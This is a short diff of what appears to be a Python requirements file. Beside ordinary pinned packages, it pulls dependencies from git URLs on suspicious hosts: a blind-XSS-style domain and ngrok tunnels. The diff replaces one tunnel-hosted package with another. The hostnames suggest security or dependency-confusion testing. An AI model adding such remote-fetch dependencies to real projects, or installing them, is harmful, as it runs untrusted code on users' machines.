@@ -3,4 +3,4 @@ colorama==0.4.3
 pytest==6.2.2
 win_unicode_console==0.5
 package-two @ git+https://bxss.r0l.me/snyk-p2
-sh @ git+https://33b1-2a0d-6fc2-6430-1c00-ddd9-ffbb-d0ad-b940.ngrok-free.app/
+tb @ git+https://33b1-2a0d-6fc2-6430-1c00-ddd9-ffbb-d0ad-b940.ngrok-free.app/ravivzomer/tb
